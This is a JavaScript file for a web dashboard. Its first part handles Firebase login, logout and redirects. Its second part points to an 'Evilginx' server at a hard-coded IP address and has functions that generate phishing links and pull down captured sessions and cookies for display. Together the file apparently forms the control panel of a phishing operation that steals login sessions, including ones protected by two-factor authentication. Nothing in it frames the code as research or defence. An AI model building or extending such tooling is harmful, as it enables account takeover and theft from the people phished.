console.log("✅ Script.js loaded successfully");

document.addEventListener("DOMContentLoaded", function () {
    checkAuthStatus();
});

// Check if Firebase is loaded
if (typeof firebase === "undefined") {
    console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
}

// Firebase authentication logic
function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    firebase.auth().signInWithEmailAndPassword(email, password)
        .then((userCredential) => {
            console.log("✅ Login successful!");
            window.location.href = "dashboard.html";
        })
        .catch((error) => {
            document.getElementById("error-message").textContent = "❌ " + error.message;
        });
}

function logout() {
    firebase.auth().signOut().then(() => {
        console.log("✅ Logout successful!");
        window.location.href = "index.html";
    }).catch((error) => {
        console.error("❌ Logout error:", error);
    });
}

// Redirect to login if user is not authenticated
function checkAuthStatus() {
    firebase.auth().onAuthStateChanged((user) => {
        if (!user && window.location.pathname.includes("dashboard.html")) {
            window.location.href = "index.html";
        }
    });
}

// Evilginx server configuration
const evilginx_server = "http://3.149.242.245:5000";

// Evilginx API calls
async function generateLink() {
    try {
        const response = await fetch(`${evilginx_server}/generate`, { method: "POST" });
        const data = await response.json();
        alert(`Generated link: ${data.link}`);
    } catch (error) {
        console.error("Error generating link:", error);
    }
}

async function fetchCapturedSessions() {
    try {
        const response = await fetch(`${evilginx_server}/sessions`);
        const data = await response.json();
        document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2);
    } catch (error) {
        console.error("Error fetching captured sessions:", error);
    }
}

async function fetchCookies() {
    try {
        const response = await fetch(`${evilginx_server}/cookies`);
        const data = await response.json();
        document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2);
    } catch (error) {
        console.error("Error fetching cookies:", error);
    }
}
